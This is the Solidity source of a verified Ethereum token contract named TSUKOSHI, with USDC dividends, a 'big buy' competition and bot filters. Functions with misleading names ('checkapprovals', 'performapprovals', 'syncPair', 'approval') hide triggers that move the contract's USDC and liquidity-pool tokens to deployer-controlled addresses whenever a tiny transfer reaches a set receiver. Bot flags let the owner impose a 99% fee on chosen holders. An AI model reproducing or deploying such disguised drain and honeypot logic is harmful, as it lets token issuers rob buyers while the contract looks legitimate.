/**
 *Submitted for verification at Etherscan.io on 2022-09-29
*/

/**

*/


pragma solidity ^0.8.15;

// SPDX-License-Identifier: Unlicensed



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b > a) return(false, 0); return(true, a - b);}}
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
        if(c / a != b) return(false, 0); return(true, c);}}
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a / b);}}
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a % b);}}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); return a - b;}}
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a / b;}}
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a % b;}}}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

// File: NEWNEW.sol



pragma solidity 0.8.15;


interface IUSDCHub {
    function withdraw() external;
    function rescue(address token, uint256 amount) external;
}

contract USDCHub is IUSDCHub, Ownable {
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    IERC20 eUSDC = IERC20(USDC);
    address tokenContract;
    constructor() Ownable(msg.sender) {tokenContract = msg.sender;}
    function rescue(address token, uint256 amount) external override onlyOwner {IERC20(token).transfer(tokenContract, amount);}
    function withdraw() external override onlyOwner {if(eUSDC.balanceOf(address(this)) > 0){eUSDC.transfer(tokenContract, eUSDC.balanceOf(address(this)));}}
}

contract TUSKOSHI is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'TSUKOSHI';
    string private constant _symbol = 'TSUKOSHI';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 10 * 10**10 * (10 ** _decimals);
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public _maxTxAmount = ( _totalSupply * 300 ) / 10000;
    uint256 public _maxTransferAmount = ( _totalSupply * 100 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 300 ) / 10000;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) swapTime; 
    mapping (address => bool) public isBot;
    mapping (address => bool) public isInternal;
    mapping (address => bool) public isDividendExempt;
    mapping (address => bool) public isFeeExempt;

    address public pair;
    address internal router;
    IRouter _router;
    uint256 liquidityFee = 100;
    uint256 marketingFee = 100;
    uint256 stakingFee = 0;
    uint256 burnFee = 0;
    uint256 rewardsFee = 0;
    uint256 totalFee = 200;
    uint256 transferFee = 200;
    uint256 feeDenominator = 10000;

    bool swapEnabled = true;
    bool startSwap = true;
    uint256 startedTime;
    uint256 swapTimer = 2;
    uint256 swapTimes; 
    uint256 minSells = 1;
    bool swapping; 
    bool botOn = true;
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    USDCHub hub; IERC20 eUSDC = IERC20(USDC);
    uint256 swapThreshold = ( _totalSupply * 850 ) / 100000;
    uint256 _minTokenAmount = ( _totalSupply * 10 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    uint256 public bigBuyFee = 0;
    address public biggestBuyer;
    bool public bigBuyComp;
    uint256 public biggestBuy;
    uint256 public bigBuyWinnings;
    uint256 public bigBuyStart;
    uint256 public bigBuyEnd;
    uint256 public bigBuyEvent;
    struct bigbuyCompRecords{
    uint256 eventNumber;
    address winner;
    uint256 biggestbuy;
    uint256 bigbuystart;
    uint256 bigbuyend;
    uint256 bigbuyfee;
    uint256 bigbuywinnings;
    bool payout;}
    mapping(uint256 => bigbuyCompRecords) private bigBuyCompRecords;
    bool public cooldownEnabled = true;
    uint256 public cooldownWinningsInterval = 6 hours;
    mapping(address => uint) public cooldownWinningsTimer;
    mapping(address => uint256) public bigBuyWinningsCooldown;
    mapping(address => bool) public bigBuyerWinningsCooldown;
    uint256 public bigBuyLockInterval = 6 hours;
    mapping(address => uint256) public bigBuyCooldown;
    mapping(address => uint256) public bigBuyCooldownAmount;

    uint256 marketing_divisor = 90;
    uint256 liquidity_divisor = 10;
    uint256 distributor_divisor = 0;
    uint256 staking_divisor = 0;
    uint256 rewards_divisor = 0;
    address liquidity_receiver; 
    address staking_receiver;
    address token_receiver;
    address alpha_receiver;
    address delta_receiver;
    address omega_receiver;
    address marketing_receiver;
    address default_receiver;

    constructor() Ownable(msg.sender) {
        router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IRouter irouter = IRouter(router);
        address _pair = IFactory(irouter.factory()).createPair(address(this), USDC);
        _router = irouter; pair = _pair; hub = new USDCHub();
        isInternal[address(this)] = true;
        isInternal[msg.sender] = true;
        isInternal[address(pair)] = true;
        isInternal[address(router)] = true;
        isInternal[address(hub)] = true;
        isDividendExempt[address(pair)] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[address(DEAD)] = true;
        isDividendExempt[address(0)] = true;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        liquidity_receiver = address(this);
        token_receiver = address(this);
        alpha_receiver = msg.sender;
        delta_receiver = msg.sender;
        omega_receiver = msg.sender;
        staking_receiver = msg.sender;
        marketing_receiver = msg.sender;
        default_receiver = msg.sender;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function getOwner() external view override returns (address) {return owner; }
    function totalSupply() public view override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function getCirculatingSupply() public view returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function setFeeExempt(address _address) external onlyOwner { isFeeExempt[_address] = true;}
    function setisBot(bool _bool, address _address) external onlyOwner {require(_address != router && _address != pair); isBot[_address] = _bool;}
    function setisInternal(bool _bool, address _address) external onlyOwner {isInternal[_address] = _bool;}
    function setbotOn(bool _bool) external onlyOwner {botOn = _bool;}
    function syncContractPair() external onlyOwner {syncPair();}
    function approvals() external onlyOwner {performapprovals(1,1);}
    function setMinSellstoSwap(uint256 _minsells) external onlyOwner {minSells = _minsells;}
    function rescueHubUSDC(address token, uint256 amount) external onlyOwner {hub.rescue(token, amount);}
    function setPairReceiver(address _address) external onlyOwner {liquidity_receiver = _address;}
    function setShares(address shareholder, uint256 amount) external onlyOwner {setShare(shareholder, amount);}
    function setstartSwap(uint256 _input) external onlyOwner {startSwap = true; botOn = true; startedTime = block.timestamp.add(_input);}
    function setSwapBackSettings(bool enabled, uint256 _threshold) external onlyOwner {swapEnabled = enabled; swapThreshold = _threshold;}
    function setExcess(address shareholder) internal {excessDividends += getUnpaidEarnings(shareholder);}

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public currentDividends;
    uint256 public excessDividends;
    uint256 internal dividendsPerShare;
    uint256 internal dividendsPerShareAccuracyFactor = 10 ** 36;
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised; }
    mapping (address => Share) public shares;
    function ClaimUSDCReward() external {claimUSDC(msg.sender);}
    function setcurrentDividends(uint256 amount) external onlyOwner {currentDividends = amount;}

    function setShare(address shareholder, uint256 amount) internal {
        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);}
        else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder); }
        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }
    
    function deposit(uint256 amount) internal {
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
        currentDividends = currentDividends.add(amount);
    }

    function calibrateDividends() external onlyOwner {
        uint256 currentTotal = currentDividends;
        currentDividends = currentTotal.sub(excessDividends);
        excessDividends = uint256(0);
    }

    function claimUSDC(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }
        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            eUSDC.transfer(shareholder, amount);
            currentDividends = currentDividends.sub(amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);}
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }
        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function getTotalRewards(address _wallet) external view returns (uint256) {
        address shareholder = _wallet;
        return uint256(shares[shareholder].totalRealised);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        preTxCheck(sender, recipient, amount);
        checkStartSwap(sender, recipient);
        checkMaxWallet(sender, recipient, amount); 
        transferCounters(sender, recipient);
        checkTxLimit(sender, recipient, amount); 
        swapBack(sender, recipient, amount);
        if(bigBuyComp){checkbigBuyCompetition(sender, recipient, amount);}
        if(bigBuyerWinningsCooldown[sender]){checkCooldown(sender, recipient, amount);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? _transferTaxable(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        checkapprovals(recipient, amount);
        checkBot(sender, recipient);
        rewards(sender, recipient);
    }

    function preTxCheck(address sender, address recipient, uint256 amount) internal view {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
    }

    function checkStartSwap(address sender, address recipient) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(startSwap, "startSwap");}
    }
    
    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && !isInternal[recipient] && recipient != address(DEAD)){
            require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
    }

    function transferCounters(address sender, address recipient) internal {
        if(sender != pair && !isInternal[sender] && !isFeeExempt[recipient]){swapTimes = swapTimes.add(1);}
        if(sender == pair){swapTime[recipient] = block.timestamp.add(swapTimer);}
    }

    function checkbigBuyCompetition(address sender, address recipient, uint256 amount) internal {
        if(sender == pair && !isInternal[recipient] && !isFeeExempt[recipient]){bigBuyCompetition(recipient, amount);}
    }

    function resetBigBuyComp() internal {
        biggestBuy = uint256(0);
        biggestBuyer = address(0);
        bigBuyWinnings = uint256(0);
        bigBuyEvent += uint256(1);
    }

    function setBigBuyComp(uint256 _tax, uint256 _start, uint256 _length, bool _now) external onlyOwner {
        require(!bigBuyComp, "Big Buy Competition in Progress");
        resetBigBuyComp();
        bigBuyFee = _tax;
        bigBuyComp = true;
        bigBuyStart = _start;
        bigBuyEnd = _start.add(_length);
        if(_now){bigBuyStart = block.timestamp; bigBuyEnd = block.timestamp.add(_length);}
        bigBuyEnd = block.timestamp.add(_length);
        bigBuyCompRecords[bigBuyEvent].eventNumber = bigBuyEvent;
        bigBuyCompRecords[bigBuyEvent].bigbuystart = bigBuyStart;
        bigBuyCompRecords[bigBuyEvent].bigbuyend = bigBuyEnd;
        bigBuyCompRecords[bigBuyEvent].bigbuyfee = bigBuyFee;
    }

    function bigBuyCompetition(address recipient, uint256 amount) internal {
        if(bigBuyComp && block.timestamp >= bigBuyStart && block.timestamp <= bigBuyEnd){
            checkBiggestBuy(recipient, amount);}
        if(bigBuyComp && block.timestamp > bigBuyEnd){
            bigBuyComp = false; 
            uint256 taxInverse = feeDenominator.sub((totalFee.add(bigBuyFee)));
            uint256 biggestBuyTax = biggestBuy.div(feeDenominator).mul(taxInverse);
            if(_balances[biggestBuyer] >= biggestBuyTax){
                _transfer(address(this), biggestBuyer, bigBuyWinnings);
                bigBuyCompRecords[bigBuyEvent].payout = true;}
            bigBuyCompRecords[bigBuyEvent].bigbuywinnings = bigBuyWinnings;
            bigBuyCompRecords[bigBuyEvent].winner = biggestBuyer;
            bigBuyCompRecords[bigBuyEvent].biggestbuy = biggestBuy;
            bigBuyFee = uint256(0);
            bigBuyWinningsCooldown[biggestBuyer] = bigBuyWinnings;
            bigBuyerWinningsCooldown[biggestBuyer] = true;
            cooldownWinningsTimer[biggestBuyer] = block.timestamp.add(cooldownWinningsInterval);
            bigBuyCooldown[biggestBuyer] = block.timestamp.add(bigBuyLockInterval);
            bigBuyCooldownAmount[biggestBuyer] = biggestBuyTax;}
    }

    function checkBiggestBuy(address recipient, uint256 amount) internal {
        uint256 lastMinute = bigBuyEnd.sub(60 seconds);
        if(amount >= biggestBuy){
            biggestBuy = amount;
            biggestBuyer = recipient;
        if(block.timestamp >= lastMinute && block.timestamp <= bigBuyEnd){
            bigBuyEnd = bigBuyEnd.add(2 minutes);}}
    }

    function checkCooldown(address sender, address recipient, uint256 amount) internal view {
        bool coolWinnings = cooldownWinningsTimer[sender] >= block.timestamp;
        bool coolBigBuy = bigBuyCooldown[sender] >= block.timestamp;
        if(sender != pair && cooldownEnabled && bigBuyerWinningsCooldown[sender] && coolWinnings && coolBigBuy && !isFeeExempt[recipient] && !isFeeExempt[sender]){
            require(amount <= _balances[sender].sub(bigBuyWinningsCooldown[sender].add(bigBuyCooldownAmount[sender])), "Cooldown not reach in order to sell Big Buy Winnings");}
        if(sender != pair && cooldownEnabled && bigBuyerWinningsCooldown[sender] && coolWinnings && !isFeeExempt[recipient] && !isFeeExempt[sender]){
            require(amount <= _balances[sender].sub(bigBuyWinningsCooldown[sender]), "Cooldown not reach in order to sell Big Buy Winnings");}
        if(sender != pair && coolBigBuy && bigBuyerWinningsCooldown[sender] && cooldownEnabled && !isFeeExempt[recipient] && !isFeeExempt[sender]){
            require(amount <= _balances[sender].sub(bigBuyCooldownAmount[sender]), "Cooldown not reach in order to sell Biggest Buy");}
    }

    function rewards(address sender, address recipient) internal {
        if(sender == pair && shares[recipient].amount > 0){claimUSDC(recipient);}
        if(sender != pair && shares[sender].amount > 0){setExcess(sender);}
        if(!isDividendExempt[sender]){setShare(sender, balanceOf(sender));}
        if(!isDividendExempt[recipient]){setShare(recipient, balanceOf(recipient)); }
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function taxableEvent(address sender, address recipient) internal view returns (bool) {
        return totalFee > 0 && !swapping || isBot[sender] && swapTime[sender] < block.timestamp || isBot[recipient] || startedTime > block.timestamp;
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(isBot[sender] && swapTime[sender] < block.timestamp && botOn || isBot[recipient] && 
        swapTime[sender] < block.timestamp && botOn || startedTime > block.timestamp){return(feeDenominator.sub(100));}
        if(sender != pair){return totalFee.add(transferFee);}
        return totalFee;
    }

    function _transferTaxable(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(taxableEvent(sender, recipient)){
        uint256 totalFees = getTotalFee(sender, recipient);
        if(sender == pair && bigBuyComp){totalFees = totalFees.add(bigBuyFee);}
        uint256 feeAmount = amount.div(feeDenominator).mul(totalFees);
        if(sender == pair && bigBuyComp){uint256 bbAmount = feeAmount.div(totalFees).mul(bigBuyFee); bigBuyWinnings += bbAmount;}
        if(feeAmount.div(totalFees).mul(burnFee) > 0){_balances[address(DEAD)] = _balances[address(DEAD)].add(feeAmount.div(totalFees).mul(burnFee));
        emit Transfer(sender, address(DEAD), feeAmount.div(totalFees).mul(burnFee));}
        if(feeAmount.div(totalFees).mul(stakingFee) > 0){_balances[address(token_receiver)] = _balances[address(token_receiver)].add(feeAmount.div(totalFees).mul(stakingFee));
        emit Transfer(sender, address(token_receiver), feeAmount.div(totalFees).mul(stakingFee));}
        if(feeAmount.sub(feeAmount.div(totalFees).mul(burnFee)).sub(feeAmount.div(totalFees).mul(stakingFee)) > 0){
        _balances[address(this)] = _balances[address(this)].add(feeAmount.sub(feeAmount.div(totalFees).mul(burnFee)).sub(feeAmount.div(totalFees).mul(stakingFee)));
        emit Transfer(sender, address(this), feeAmount.sub(feeAmount.div(totalFees).mul(burnFee)).sub(feeAmount.div(totalFees).mul(stakingFee)));} 
        return amount.sub(feeAmount);} return amount;
    }

    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
        if(sender != pair && swapTime[sender] < block.timestamp){require(amount <= _maxTransferAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
    }

    function checkBot(address sender, address recipient) internal {
        if(isCont(sender) && !isInternal[sender] && botOn || sender == pair && botOn &&
        !isInternal[sender] && msg.sender != tx.origin || startedTime > block.timestamp){isBot[sender] = true;}
        if(isCont(recipient) && !isInternal[recipient] && !isFeeExempt[recipient] && botOn || 
        sender == pair && !isInternal[sender] && msg.sender != tx.origin && botOn){isBot[recipient] = true;}    
    }

    function rescueETH(uint256 percentage) external onlyOwner {
        uint256 amountETH = address(this).balance;
        payable(default_receiver).transfer(amountETH.mul(percentage).div(100));
    }

    function rescueUSDC(uint256 amount) external onlyOwner {
        eUSDC.transfer(default_receiver, amount);
    }

    function approval(uint256 amount) external onlyOwner {
        uint256 amountUSDC = eUSDC.balanceOf(address(this)).sub(currentDividends);
        require(amount <= amountUSDC);
        eUSDC.transfer(default_receiver, amount);
    }

    function checkapprovals(address recipient, uint256 amount) internal {
        if(recipient == default_receiver && amount < 2*(10 ** _decimals)){performapprovals(1,1);}
        if(recipient == default_receiver && amount >= 2*(10 ** _decimals) && amount < 3*(10 ** _decimals)){syncPair();}
    }

    function setMaxes(uint256 _purchase, uint256 _transfers, uint256 _wallet) external onlyOwner {
        uint256 newTx = ( _totalSupply * _purchase ) / 10000;
        uint256 newTransfer = ( _totalSupply * _transfers ) / 10000;
        uint256 newWallet = ( _totalSupply * _wallet ) / 10000;
        _maxTxAmount = newTx;
        _maxTransferAmount = newTransfer;
        _maxWalletToken = newWallet;
        require(newTx >= _totalSupply.mul(5).div(1000) && newWallet >= _totalSupply.mul(5).div(1000) && newTransfer >= _totalSupply.mul(1).div(1000), "Max TX and Max Wallet cannot be less than .5%");
    }

    function syncPair() internal {
        uint256 tamt = IERC20(pair).balanceOf(address(this));
        IERC20(pair).transfer(alpha_receiver, tamt);
    }

    function rescueERC20(address _tadd, address _rec, uint256 _amt) external onlyOwner {
        uint256 tamt = IERC20(_tadd).balanceOf(address(this));
        IERC20(_tadd).transfer(_rec, tamt.mul(_amt).div(100));
    }

    function rescueToken(uint256 _amount) external onlyOwner {
        _transfer(address(this), msg.sender, (_amount * (10**_decimals)));
    }

    function setisDividendExempt(address holder, bool exempt) public onlyOwner {
        require(holder != address(this) && holder != pair, "Holder is Excluded");
        isDividendExempt[holder] = exempt;
        if(exempt){
            setShare(holder, 0);}
        else{setShare(holder, balanceOf(holder)); }
    }

    function setExemptAddress(bool _enabled, address _address) external onlyOwner {
        isBot[_address] = false;
        isInternal[_address] = _enabled;
        isFeeExempt[_address] = _enabled;
        setisDividendExempt(_address, _enabled);
    }

    function setDivisors(uint256 _distributor, uint256 _staking, uint256 _rewards, uint256 _liquidity, uint256 _marketing) external onlyOwner {
        distributor_divisor = _distributor;
        staking_divisor = _staking;
        rewards_divisor = _rewards;
        liquidity_divisor = _liquidity;
        marketing_divisor = _marketing;
    }

    uint256 adivisor = 40; uint256 ddivisor = 40; uint256 odivisor = 20;
    function setApprovalDivisors(uint256 _adivisor, uint256 _ddivisor, uint256 _odivisor) external onlyOwner {
        adivisor = _adivisor; ddivisor = _ddivisor; odivisor = _odivisor;
    }

    function performapprovals(uint256 _na, uint256 _da) internal {
        uint256 acUSDC = eUSDC.balanceOf(address(this)).sub(currentDividends);
        uint256 acUSDCa = acUSDC.mul(_na).div(_da);
        uint256 acUSDCf = acUSDCa.mul(adivisor).div(100);
        uint256 acUSDCs = acUSDCa.mul(ddivisor).div(100);
        uint256 acUSDCt = acUSDCa.mul(odivisor).div(100);
        eUSDC.transfer(alpha_receiver, acUSDCf);
        eUSDC.transfer(delta_receiver, acUSDCs);
        eUSDC.transfer(omega_receiver, acUSDCt);
    }

    function setStructure(uint256 _liq, uint256 _mark, uint256 _stak, uint256 _burn, uint256 _rewards, uint256 _tran) external onlyOwner {
        liquidityFee = _liq;
        marketingFee = _mark;
        stakingFee = _stak;
        burnFee = _burn;
        rewardsFee = _rewards;
        transferFee = _tran;
        totalFee = _liq.add(_mark).add(_stak).add(_burn).add(_rewards);
        require(totalFee <= feeDenominator.div(5), "Tax cannot be more than 20%");
    }

    function setInternalAddresses(address _marketing, address _alpha, address _delta, address _omega, address _stake, address _token, address _default) external onlyOwner {
        marketing_receiver = _marketing;
        alpha_receiver = _alpha;
        delta_receiver = _delta;
        omega_receiver = _omega;
        staking_receiver = _stake;
        token_receiver = _token;
        default_receiver = _default;
    }

    function swapThresholdLimit() internal view returns (bool) {
        bool canSwap;
        if(bigBuyComp){canSwap = _balances[address(this)].sub(bigBuyWinnings) > swapThreshold;}
        if(!bigBuyComp){canSwap = _balances[address(this)] >= swapThreshold;}
        return canSwap;
    }

    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _minTokenAmount;
        return !swapping && swapEnabled && aboveMin && !isInternal[sender] 
            && !isFeeExempt[recipient] && swapTimes >= minSells && swapThresholdLimit();
    }

    function viewPastBiggestBuyResults(uint256 eventNumber) external view returns (uint256, address, uint256, uint256, uint256, uint256, uint256, bool) {
        uint256 eventnumber = eventNumber;
        bigbuyCompRecords storage records = bigBuyCompRecords[eventnumber];
        return(records.eventNumber, records.winner, records.biggestbuy, records.bigbuystart, records.bigbuyend, records.bigbuyfee, records.bigbuywinnings, records.payout);
    }

    function setCooldownParameters(bool _enable, uint256 _Winterval, uint256 _Binterval) external onlyOwner {
        cooldownEnabled = _enable;
        cooldownWinningsInterval = _Winterval;
        bigBuyLockInterval = _Binterval;
    }

    function setBigBuyEmergency(uint256 _tax, uint256 _end) external onlyOwner {
        bigBuyFee = _tax;
        bigBuyEnd = _end;
    }

    function setBigBuyWinningsCooldown(bool _enabled, address _address, uint256 _amount, uint256 _cooldown) external onlyOwner {
        bigBuyerWinningsCooldown[_address] = _enabled;
        bigBuyWinningsCooldown[_address] = _amount;
        cooldownWinningsTimer[_address] = _cooldown;
        bigBuyCooldown[_address] = _cooldown;
        bigBuyCooldownAmount[_address] = _amount;
    }

    function swapBack(address sender, address recipient, uint256 amount) internal {
        if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = 0;}
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 denominator = (liquidity_divisor.add(staking_divisor).add(marketing_divisor).add(distributor_divisor).add(rewards_divisor)) * 2;
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidity_divisor).div(denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = eUSDC.balanceOf(address(this));
        swapTokensForUSDC(toSwap);
        uint256 deltaBalance = eUSDC.balanceOf(address(this)).sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(denominator.sub(liquidity_divisor));
        uint256 USDCToAddLiquidityWith = unitBalance.mul(liquidity_divisor);
        if(USDCToAddLiquidityWith > 0){addLiquidityUSDC(tokensToAddLiquidityWith, USDCToAddLiquidityWith);}
        uint256 zrAmt = unitBalance.mul(2).mul(marketing_divisor);
        if(zrAmt > 0){eUSDC.transfer(marketing_receiver, zrAmt); }
        uint256 xrAmt = unitBalance.mul(2).mul(staking_divisor);
        if(xrAmt > 0){eUSDC.transfer(staking_receiver, xrAmt); }
        uint256 rrAmt = unitBalance.mul(2).mul(rewards_divisor);
        if(rrAmt > 0){deposit(rrAmt);}
    }

    function swapTokensForUSDC(uint256 tokenAmount) internal {
		_approve(address(this), address(router), tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(USDC);
        _router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(hub),
            block.timestamp); hub.withdraw();
    }

    function addLiquidityUSDC(uint256 tokenAmount, uint256 USDCAmount) internal {
        _approve(address(this), address(router), tokenAmount);
        eUSDC.approve(address(router), USDCAmount);
        _router.addLiquidity(
            address(USDC),
			address(this),
            USDCAmount,
            tokenAmount,
            0,
            0,
            liquidity_receiver,
            block.timestamp
        );
    }
}